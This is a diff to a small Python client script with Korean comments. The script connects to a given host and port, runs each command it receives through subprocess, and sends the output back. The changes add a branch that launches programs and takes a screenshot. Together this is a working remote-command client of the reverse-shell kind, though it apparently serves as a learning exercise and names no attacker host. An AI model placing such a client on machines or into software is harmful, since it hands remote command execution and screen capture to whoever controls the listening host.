@@ -1,4 +1,5 @@
 import socket, subprocess, threading, os
+
 def connect(h, p):
     cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cSocket.connect((h, p))
@@ -18,14 +19,15 @@ def connect(h, p):
 
             if msg.find('python3') == 0 : # 파일을 실행하면 먼저 데이터 send해놓고 파일 실행
                 print(msg, " 파일을 실행합니다")
-                data = '파일 실행중...'
-                cSocket.send(data.encode())
-                data = subprocess.run(msg.split(' '))
+                subprocess.Popen(msg.split(' ')) # run 아닌 Popen은 이유는 프로그램이 끝날 때 까지 기다리지 않기 때문
+                subprocess.run('gnome-screenshot -d 5 -f 123.png', shell=True) # 프로그램 실행되어있는지 스크린샷 찍는 명령어
+                msg = 'clear'
+                cSocket.send(msg.encode())
                 
             elif msg.find('cd') == 0: # cd .. 명령어가 되지 않기 때문에 따로 빼 놓는다.
                 cd = msg.split(' ')
                 os.chdir(cd[1])
-                data = subprocess.run('pwd', stdout=subprocess.PIPE, encoding='utf-8')
+                data = subprocess.run('pwd', stdout=subprocess.PIPE,shell= True, encoding='utf-8')
                 msg = data.stdout
                 cSocket.send(msg.encode())
 
@@ -43,7 +45,6 @@ def connect(h, p):
                     continue
 
                 msg = data.stdout
-
                 if msg == '' : # 문자열을 입력받는 명령어가 아니라면 
                     msg = 'success'
                     cSocket.send(msg.encode())
